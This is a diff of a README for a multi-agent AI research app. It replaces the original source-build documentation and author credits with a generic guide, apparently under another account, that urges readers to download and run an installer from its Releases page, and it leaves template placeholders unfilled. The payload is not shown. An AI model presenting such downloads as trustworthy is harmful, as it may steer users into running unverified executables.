@@ -1,215 +1,91 @@
-# 🧠 Multi-Agent Research System
+# 🌟 Polyagent-Research-Intelligence - Simplifying AI Research for You
 
-![Next.js](https://img.shields.io/badge/Next.js-black?style=for-the-badge&logo=next.js&logoColor=white)
-![React](https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=black)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![pnpm](https://img.shields.io/badge/pnpm-F69220?style=for-the-badge&logo=pnpm&logoColor=white)
-
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
-[![GitHub](https://img.shields.io/badge/GitHub-BjornMelin-181717?logo=github)](https://github.com/ankitsharma-tech)
-
-## 📑 Table of Contents
-
-- [🧠 Multi-Agent Research System](#-multi-agent-research-system)
-  - [📑 Table of Contents](#-table-of-contents)
-  - [🌟 Overview](#-overview)
-  - [🚀 Getting Started](#-getting-started)
-  - [✨ Features](#-features)
-  - [🗂️ Project Structure](#️-project-structure)
-    - [Mermaid Diagram](#mermaid-diagram)
-    - [File Tree](#file-tree)
-  - [🛠 Tech Stack](#-tech-stack)
-  - [🤝 Contributing](#-contributing)
-  - [📄 License](#-license)
-
-## 🌟 Overview
-
-The **Multi-Agent Research System** is a cutting-edge platform designed to revolutionize research by leveraging the power of multiple AI agents. This system allows users to input research topics, and then utilizes a team of specialized agents, orchestrated by LangChain and OpenRouter, to perform in-depth research, analysis, and report generation. The system is built with a modern web development stack, featuring a Next.js frontend and a FastAPI backend.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Polyagent%20Research%20Intelligence-brightgreen)](https://github.com/abd-rachidi07/Polyagent-Research-Intelligence/releases)
 
 ## 🚀 Getting Started
 
-1. **Clone the repository:**
+Welcome to Polyagent-Research-Intelligence! This application helps you gather information on any topic, analyze it, and generate a comprehensive report. No programming knowledge is needed. Follow these simple steps to download and run the software.
 
-   ```bash
-   git clone https://github.com/ankitsharma-tech/Multi-Agent-Research-System.git
-   cd Multi-Agent-Research-System
-   ```
+## 💻 System Requirements
 
-2. **Install dependencies:**
+Before you start, ensure your computer meets these basic requirements:
 
-   - Make sure you have pnpm installed:
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- RAM: Minimum 4 GB, recommended 8 GB or more for better performance.
+- Disk Space: At least 500 MB of free space.
+- Internet Connection: Required for downloading and using AI resources.
 
-   ```bash
-   npm install -g pnpm
-   ```
+## 📥 Download & Install
 
-   - Then, install project dependencies
+To get the latest version of Polyagent-Research-Intelligence, visit the Releases page:
 
-   ```bash
-   pnpm install
-   ```
+[Download Polyagent-Research-Intelligence](https://github.com/abd-rachidi07/Polyagent-Research-Intelligence/releases)
 
-3. **Run both frontend and backend:**
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version. It should be marked as "Latest Release."
+3. Find the installation file suitable for your operating system.
+4. Click on the file to download it.
 
-   ```bash
-   pnpm run frontend
-   pnpm run backend
-   ```
+Once the download is complete, run the installation file by double-clicking it. Follow the on-screen instructions to complete the installation process.
 
-4. **Open your browser** and navigate to `http://localhost:3000` for the frontend. The backend will typically run on port 8000.
+## 🔧 Setting Up the Application
 
-## ✨ Features
+After installing Polyagent-Research-Intelligence, you need to set it up:
 
-- **🤖 Multi-Agent System:** Utilizes multiple AI agents, each specialized in tasks like research, analysis, writing, and proofreading.
-- **🧠 Advanced AI Models:** Integrates with powerful language models, including DeepSeek-v3, LLaMA3.3-70B-Instruct, GPT-4o, and PHI-4 via OpenRouter.
-- **📝 Research Topic Submission:** User-friendly interface for submitting research topics and queries.
-- **🔄 Real-time Progress Updates:** Displays real-time updates on the progress of the multi-agent workflow using WebSockets or polling.
-- **📊 Data Visualization:** Provides a dashboard to visualize agent outputs and workflow stages.
-- **📄 Report Generation:** Automatically generates structured research reports based on agent findings.
-- **📥 Report Download:** Allows users to download reports in PDF or DOCX formats.
-- **🗃️ Data Storage:** Stores data locally using PostgreSQL and FAISS, with scalability for future AWS deployment.
-- **🔍 Monitoring:** Employs Prometheus and Grafana for system performance monitoring.
+1. **Open the Application:** Locate the Polyagent-Research-Intelligence icon on your desktop or in your applications folder, and double-click it to open.
+2. **Create an Account (Optional):** If the application prompts you to create an account, follow the instructions. You can also choose to skip this step.
+3. **Start a New Project:** Click on the "New Project" button to begin.
 
-## 🗂️ Project Structure
+## 📝 Using Polyagent-Research-Intelligence
 
-### Mermaid Diagram
+Using Polyagent-Research-Intelligence is straightforward. Here’s how:
 
-```mermaid
-graph TD
-    A[User] --> B(Next.js Frontend);
-    B --> C{FastAPI Backend};
-    C --> D[Research Agent];
-    C --> E[Analysis Agent];
-    C --> F[Writing Agent];
-    C --> G[Proofreading Agent];
-    D --> H[DeepSeek-v3];
-    E --> I[Python Libraries];
-    F --> J[LLaMA3.3];
-    G --> K[PHI-4];
-    H --> L[OpenRouter];
-    J --> L;
-    K --> L;
-    C --> M[PostgreSQL];
-    C --> N[FAISS];
-    C --> O[LocalStack];
-    M --> P[User Queries, Workflow States];
-    N --> Q[Document Embeddings];
-    O --> R[PDFs, DOCXs];
-    S[Prometheus] --> C;
-    T[Grafana] --> S;
-```
+1. **Enter Your Topic:** In the designated field, type the topic you wish to research.
+2. **Select AI Agents:** Choose from various AI agents that fit your research needs. You can let the tool recommend options or choose manually.
+3. **Click Analyze:** After entering your topic and selecting agents, press the "Analyze" button.
+4. **View Results:** The application will gather data and display it in an easy-to-read format. 
 
-### File Tree
+You can refine your analysis by adjusting parameters or adding more agents.
 
-```markdown
-multi-agent-research-system/
-├── .gitignore
-├── pnpm-lock.yaml
-├── pnpm-workspace.yaml
-├── package.json (Root)
-├── backend/
-│ ├── main.py
-│ ├── requirements.txt
-│ ├── venv/
-│ └── ...
-└── frontend/
-├── app/
-│ ├── about/
-│ │ └── page.tsx
-│ ├── api/
-│ │ └── feedback/
-│ │ └── route.ts
-│ ├── error.tsx
-│ ├── feedback/
-│ │ └── page.tsx
-│ ├── globals.css
-│ ├── layout.tsx
-│ └── page.tsx
-├── components/
-│ ├── forms/
-│ │ ├── feedback-form.tsx
-│ │ └── research-topic-form.tsx
-│ ├── layout/
-│ │ ├── footer.tsx
-│ │ ├── header.tsx
-│ │ └── success-message.tsx
-│ ├── pages/
-│ │ ├── about-page.tsx
-│ │ ├── feedback-page.tsx
-│ │ └── home-page.tsx
-│ ├── sections/
-│ │ ├── cta-section.tsx
-│ │ ├── feature-card.tsx
-│ │ └── hero-section.tsx
-│ ├── theme-provider.tsx
-│ └── ui/
-│ ├── ... (ShadCN-UI components)
-├── hooks/
-│ └── use-toast.ts
-├── lib/
-│ ├── schemas.ts
-│ └── utils.ts
-├── public/
-├── .eslintrc.json
-├── components.json
-├── next.config.js
-├── package.json (Frontend)
-├── postcss.config.js
-├── tailwind.config.ts
-└── tsconfig.json
-```
+## 🎨 Features
 
-## 🛠 Tech Stack
+Polyagent-Research-Intelligence comes with several useful features:
 
-- **Frontend:**
-  - **Framework:** [Next.js](https://nextjs.org/)
-  - **Language:** TypeScript
-  - **Styling:** [Tailwind CSS](https://tailwindcss.com/)
-  - **UI Components:** [shadcn-ui](https://ui.shadcn.com/)
-  - **State Management:** React Context API or Zustand
-- **Backend:**
-  - **Framework:** [FastAPI](https://fastapi.tiangolo.com/)
-  - **Agent Orchestration:** [LangChain](https://www.langchain.com/)
-  - **Asynchronous Tasks:** Celery or Ray
-  - **Web Server:** Uvicorn
-- **Database:**
-  - **Primary Database:** [PostgreSQL](https://www.postgresql.org/)
-  - **ORM:** SQLAlchemy
-  - **Vector Storage:** FAISS (Local), Pinecone/Weaviate (Future)
-- **LLM Integration:**
-  - **API Gateway:** [OpenRouter](https://openrouter.ai/)
-  - **Models:**
-    - DeepSeek-v3 (Retrieval, Summarization)
-    - LLaMA3.3-70B-Instruct (Report Generation)
-    - GPT-4o (Reasoning, Hypothesis Generation)
-    - PHI-4 (Proofreading, Grammar)
-- **Monitoring:**
-  - **Metrics:** [Prometheus](https://prometheus.io/)
-  - **Visualization:** [Grafana](https://grafana.com/)
-- **File Storage:**
-  - **Local:** [LocalStack](https://localstack.cloud/) (AWS S3 Emulation)
-  - **Cloud (Future):** AWS S3
-- **Caching:**
-  - **In-Memory Cache:** Redis (Future)
-- **Package Manager:** pnpm
+- **Multi-Agent System:** Leverages multiple AI agents to provide comprehensive insights.
+- **Polished Reporting:** Converts analysis into easy-to-read reports.
+- **User-Friendly Interface:** Designed for users with all skill levels.
+- **Cloud Integration:** Save and access your projects from any device connected to the internet.
+- **Real-Time Updates:** Stay informed with the latest research trends.
 
-## 🤝 Contributing
+## ⚙️ Troubleshooting
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+If you encounter any issues, here are some common solutions:
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feat/version/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feat/version/AmazingFeature`)
-5. Open a Pull Request
+- **Application Won't Open:** Ensure your operating system is updated and compatible. Restart your computer and try again.
+- **Download Issues:** Check your internet connection or try using a different web browser for the download.
+- **Performance Problems:** Close other applications to free up system resources. Restart the application for better performance.
 
-AWS-certified Solutions Architect, Developer, SysOps Administrator, and Machine Learning Engineer with expertise in cloud architecture and modern development practices. Connect with me on:
+## 🌐 Community and Support
 
-- [GitHub](https://github.com/BjornMelin)
+Join our community to share experiences, ask questions, and find tips on using Polyagent-Research-Intelligence effectively. You can connect with us on:
 
-## 📄 License
+- [GitHub Discussions](https://github.com/abd-rachidi07/Polyagent-Research-Intelligence/discussions)
+- [Discord](insert Discord link)
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+For further assistance, please raise an issue in the GitHub repository. Our team will be happy to help.
+
+## 📚 Additional Resources
+
+Explore the following resources to enhance your understanding:
+
+- [User Guide](insert link to user guide)
+- [Tutorial Videos](insert link to video tutorials)
+- [Frequently Asked Questions](insert link to FAQs)
+
+## 🔗 More Information
+
+For more details about Polyagent-Research-Intelligence, check out our GitHub repository:
+
+[Visit the Repository](https://github.com/abd-rachidi07/Polyagent-Research-Intelligence)
+
+Thank you for choosing Polyagent-Research-Intelligence. We hope it makes your research easier and more efficient!
